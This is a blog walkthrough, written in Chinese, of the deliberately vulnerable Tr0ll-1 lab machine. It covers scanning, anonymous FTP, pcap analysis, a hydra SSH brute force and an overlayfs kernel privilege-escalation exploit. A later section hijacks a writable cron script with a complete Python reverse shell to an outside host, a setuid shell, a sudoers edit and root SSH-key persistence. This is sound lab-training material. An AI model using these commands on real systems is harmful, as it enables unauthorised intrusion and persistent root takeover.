@@ -1,0 +1,208 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>渗透-Tr0ll-1 | xxxRetr0</title><meta name="author" content="xxxRetr0"><meta name="copyright" content="xxxRetr0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1、nmap枚举nmap -sP 192.168.133.0&#x2F;24nmap -p- 192.168.133.13121&#x2F;tcp open  ftp22&#x2F;tcp open  ssh80&#x2F;tcp open  http  nmap 192.168.133.131 -p- -sS -sV -A1）ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透-Tr0ll-1">
+<meta property="og:url" content="http://example.com/2024/02/05/%E6%B8%97%E9%80%8F-Tr0ll-1/index.html">
+<meta property="og:site_name" content="xxxRetr0">
+<meta property="og:description" content="1、nmap枚举nmap -sP 192.168.133.0&#x2F;24nmap -p- 192.168.133.13121&#x2F;tcp open  ftp22&#x2F;tcp open  ssh80&#x2F;tcp open  http  nmap 192.168.133.131 -p- -sS -sV -A1）ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2024-02-05T15:30:44.000Z">
+<meta property="article:modified_time" content="2024-02-05T15:32:43.707Z">
+<meta property="article:author" content="xxxRetr0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/02/05/%E6%B8%97%E9%80%8F-Tr0ll-1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '渗透-Tr0ll-1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-02-05 23:32:43'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="xxxRetr0" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">49</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">xxxRetr0</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">渗透-Tr0ll-1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-02-05T15:30:44.000Z" title="Created 2024-02-05 23:30:44">2024-02-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-02-05T15:32:43.707Z" title="Updated 2024-02-05 23:32:43">2024-02-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="渗透-Tr0ll-1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>1、nmap枚举<br>nmap -sP 192.168.133.0/24<br>nmap -p- 192.168.133.131<br>21/tcp open  ftp<br>22/tcp open  ssh<br>80/tcp open  http</p>
+<p><img src="https://s2.loli.net/2024/02/03/5LXcGFJ94yAo1UY.png" alt="image-20240203212739207"></p>
+<p>nmap 192.168.133.131 -p- -sS -sV -A<br>1）ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>|_-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap </p>
+<p>2）22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)<br>3）80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu)<br>| http-robots.txt: 1 disallowed entry<br>|_/secret</p>
+<p>发现ftp存在lol.pcap流量文件，还有FTP带有匿名登录名：Anonymous FTP login allowed，80http存在robots.txt和/secret目录文件。</p>
+<p><img src="https://s2.loli.net/2024/02/03/lYEGq5iLxoysAn6.png" alt="image-20240203213223366"></p>
+<p>2、登录FTP枚举<br>账号密码：<br>Anonymous<br>Anonymous</p>
+<p>ftp 192.168.133.131<br>dir<br>get lol.pcap</p>
+<p>3、wireshark分析流量<br>wireshark lol.pcap</p>
+<p>wireshark对流量界面右键-&gt;追踪流量-&gt;TCP流量！<br>获得tcp.stream eq 1和tcp.stream eq 2等信息：<br>tcp.stream eq 1：第一个流显示了一个文件secret_stuff.txt</p>
+<p>tcp.stream eq 2：sup3rs3cr3tdirlol</p>
+<p>Well, well, well, aren’t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P</p>
+<p>Sucks, you were so close… gotta TRY HARDER!</p>
+<p><img src="https://s2.loli.net/2024/02/03/SjUuaZCmn5QOiKw.png" alt="image-20240203215152851"></p>
+<p>4、页面枚举<a target="_blank" rel="noopener" href="http://192.168.133.131/sup3rs3cr3tdirlol/">http://192.168.133.131/sup3rs3cr3tdirlol/</a><br>roflmao下载！<br>file roflmao    —枚举是32位的ELF 二进制文件</p>
+<p>strings roflmao 发现Find address 0x0856BF to proceed</p>
+<p><img src="https://s2.loli.net/2024/02/03/my5gtPESTrH7wA6.png" alt="image-20240203220105870"></p>
+<p>hexeditor roflmao  —十六进制的也可以用这个发现！</p>
+<p>5、页面枚举<a target="_blank" rel="noopener" href="http://192.168.133.131/0x0856BF/">http://192.168.133.131/0x0856BF/</a><br>存在两页页面：good_luck/   this_folder_contains_the_password/    </p>
+<p><img src="https://s2.loli.net/2024/02/03/g397RjZTrqaLvzk.png" alt="image-20240203220214675"><br>初步猜测是用户密码hydra爆破！</p>
+<p>6、hydra爆破<br>hydra -L user.txt -p Pass.txt 192.168.133.131 ssh<br>[22][ssh] host: 192.168.133.131   login: overflow   password: Pass.txt</p>
+<p><img src="https://s2.loli.net/2024/02/03/8lKUI6PBb4oQRhZ.png" alt="image-20240203221330826"></p>
+<p>7、登录系统ssh</p>
+<p>遇到意外：</p>
+<p><img src="https://s2.loli.net/2024/02/03/JPyEIUdGsW4Zxev.png" alt="image-20240203222034007"></p>
+<p>此报错是由于远程的主机的公钥发生了变化导致的。<br>ssh服务是通过公钥和私钥来进行连接的，它会把每个曾经访问过计算机或服务器的公钥（public key），记录在~/.ssh/known_hosts 中，当下次访问曾经访问过的计算机或服务器时，ssh就会核对公钥，如果和上次记录的不同，OpenSSH会发出警告。</p>
+<p>这里我们使用命令清除所连接的IP后重新连接即可：</p>
+<p><img src="https://s2.loli.net/2024/02/03/gKVyuiUHberFcsS.png" alt="image-20240203222411339"></p>
+<p>ssh <a href="mailto:&#111;&#x76;&#x65;&#114;&#x66;&#x6c;&#111;&#x77;&#x40;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#46;&#49;&#x33;&#51;&#x2e;&#x31;&#51;&#x31;">&#111;&#x76;&#x65;&#114;&#x66;&#x6c;&#111;&#x77;&#x40;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#46;&#49;&#x33;&#51;&#x2e;&#x31;&#51;&#x31;</a><br>$ uname -a<br>Linux 4-Tr0ll 3.13.0</p>
+<p>尝试是否能够进行内核提权</p>
+<p>searchsploit Linux ubuntu 3.13.0<br>只有两个符合的：<br>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - ‘overlayfs’ Local Privilege Escalation                                        | linux/local/37292.c<br>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - ‘overlayfs’ Local Privilege Escalation (Access /etc/shadow)                   | linux/local/37293.txt</p>
+<p>利用37292.c：<br>cp /usr/share/exploitdb/exploits/linux/local/37292.c /root/桌面</p>
+<p><img src="https://s2.loli.net/2024/02/05/cyqEU8ZL49uHXw3.png" alt="image-20240205215134404"></p>
+<p>python -c ‘import pty; pty.spawn(“/bin/bash”)’<br>python -m http.server 8081<br>wget <a target="_blank" rel="noopener" href="http://192.168.133.19:8081/37292.c">http://192.168.133.19:8081/37292.c</a><br>gcc 37292.c -o test1<br>./test1<br>id<br>cd /root<br>cat proof.txt</p>
+<p>Good job, you did it!<br>702a8c18d29c6f3ca0d99ef5712bfbdc</p>
+<p><img src="https://s2.loli.net/2024/02/05/Uwe4iICYs1nbz6f.png" alt="image-20240205220030364"></p>
+<hr>
+<p>拓展思路：<br>Broadcast Message from root@trol<br>        (somewhere) at 6:00 …                                                </p>
+<p>TIMES UP LOL!                                                                  </p>
+<p>Connection to 192.168.133.131 closed by remote host.</p>
+<p>Connection to 192.168.133.131 closed.</p>
+<p><img src="https://s2.loli.net/2024/02/05/4ERbjqnKuGclUyd.png" alt="image-20240205220657990"></p>
+<p>它会自动结束ssh进程，而且还是整点提示！说明有计划任务在自动到点结束进程。每5分钟就被踢一次！<br>find / -name cronlog 2&gt;/dev/null    —查看计划任务日志信息<br>find / -name cleaner.py 2&gt;/dev/null   —查看文件在哪儿<br>find / -writable 2&gt;/dev/null   —枚举所有可写入权限的文件<br>find / -perm -o+w -type f 2&gt; /dev/null | grep /proc -v   —枚举<br>/lib/log/cleaner.py</p>
+<p>知道了计划任务和py脚本可写入，以及py的位置后，那么方法千万种，接下来演示三种：<br>1）反弹shell<br>2）创建root可执行程序，获得root权限<br>3）写入ssh rsa，ssh登录root用户</p>
+<p>nano使用教程：</p>
+<h2 id="ctrl-x-y"><a href="#ctrl-x-y" class="headerlink" title="ctrl x | y"></a>ctrl x | y</h2><p>1）反弹shell<br>nc -tvlp 9999</p>
+<p>#!/usr/bin/python<br>def con():<br>    import socket, time,pty, os<br>    host=’192.168.133.53’<br>    port=9999<br>    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>    s.settimeout(10)<br>    s.connect((host,port))<br>    os.dup2(s.fileno(),0)<br>    os.dup2(s.fileno(),1)<br>    os.dup2(s.fileno(),2)<br>    os.putenv(“HISTFILE”,’/dev/null’)<br>    pty.spawn(“/bin/bash”)<br>    s.close()<br>con()</p>
+<p>该脚本在可执行脚本中均可进行尝试</p>
+<p><img src="https://s2.loli.net/2024/02/05/xhLYnoDjZ6HJ7Ee.png" alt="image-20240205224110321"></p>
+<hr>
+<p>2）创建root可执行程序，获得root权限</p>
+<p>编辑目标机cleaner.py命令执行部分：</p>
+<p>os.system(‘cp /bin/sh /tmp/test1’)<br>os.system(‘chmod u+s /tmp/test1’)</p>
+<p>或者编辑脚本以将用户溢出添加到sudoers文件中可以sudo su到root用户：<br>os.system(‘echo “overflow ALL=(ALL) ALL” &gt;&gt; /etc/sudoers’)</p>
+<p>cd /tmp<br>ls<br>./sh<br>cd /root<br>ls<br>cat proof.txt</p>
+<p>3）写入ssh rsa，ssh登录root用户<br>ssh-keygen   —都空格回车<br>cd ~/.ssh    （后续ssh连接需要在该目录下执行）</p>
+<p>此时在该目录下生成 id_rsa, id_rsa.pub, known_hosts 三个文件</p>
+<p>cat id_rsa.pub</p>
+<p>编辑目标机cleaner.py命令执行部分：</p>
+<p>os.system(‘mkdir /root/.ssh; chmod 775 .ssh; echo “(id_rsa.pub产生的密匙内容)” &gt;&gt; /root/.ssh/authorized_keys’)</p>
+<p>等待目标机自动运行cleaner.py</p>
+<p>在~/.ssh目录下用root用户进行ssh连接，与该目录下 id_rsa 识别碰撞即可免密码登录root</p>
+<hr>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">xxxRetr0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/02/05/%E6%B8%97%E9%80%8F-Tr0ll-1/">http://example.com/2024/02/05/%E6%B8%97%E9%80%8F-Tr0ll-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/02/02/%E6%B8%97%E9%80%8F-Raven-2/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">渗透-Raven-2</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">xxxRetr0</div><div class="author-info__description">yaHuuuuuu</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">49</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxRetr0"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctrl-x-y"><span class="toc-number">1.</span> <span class="toc-text">ctrl x | y</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/02/05/%E6%B8%97%E9%80%8F-Tr0ll-1/" title="渗透-Tr0ll-1"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透-Tr0ll-1"/></a><div class="content"><a class="title" href="/2024/02/05/%E6%B8%97%E9%80%8F-Tr0ll-1/" title="渗透-Tr0ll-1">渗透-Tr0ll-1</a><time datetime="2024-02-05T15:30:44.000Z" title="Created 2024-02-05 23:30:44">2024-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/02/%E6%B8%97%E9%80%8F-Raven-2/" title="渗透-Raven-2"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透-Raven-2"/></a><div class="content"><a class="title" href="/2024/02/02/%E6%B8%97%E9%80%8F-Raven-2/" title="渗透-Raven-2">渗透-Raven-2</a><time datetime="2024-02-02T14:19:46.000Z" title="Created 2024-02-02 22:19:46">2024-02-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/01/%E6%B8%97%E9%80%8F-Lampiao/" title="渗透-Lampiao"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透-Lampiao"/></a><div class="content"><a class="title" href="/2024/02/01/%E6%B8%97%E9%80%8F-Lampiao/" title="渗透-Lampiao">渗透-Lampiao</a><time datetime="2024-02-01T12:16:07.000Z" title="Created 2024-02-01 20:16:07">2024-02-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/08/VulnHub-DarkHole-1/" title="VulnHub-DarkHole-1"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VulnHub-DarkHole-1"/></a><div class="content"><a class="title" href="/2023/04/08/VulnHub-DarkHole-1/" title="VulnHub-DarkHole-1">VulnHub-DarkHole-1</a><time datetime="2023-04-08T12:46:14.000Z" title="Created 2023-04-08 20:46:14">2023-04-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/16/BUU-easy-web/" title="BUU-easy_web"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUU-easy_web"/></a><div class="content"><a class="title" href="/2023/03/16/BUU-easy-web/" title="BUU-easy_web">BUU-easy_web</a><time datetime="2023-03-16T04:30:08.000Z" title="Created 2023-03-16 12:30:08">2023-03-16</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By xxxRetr0</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
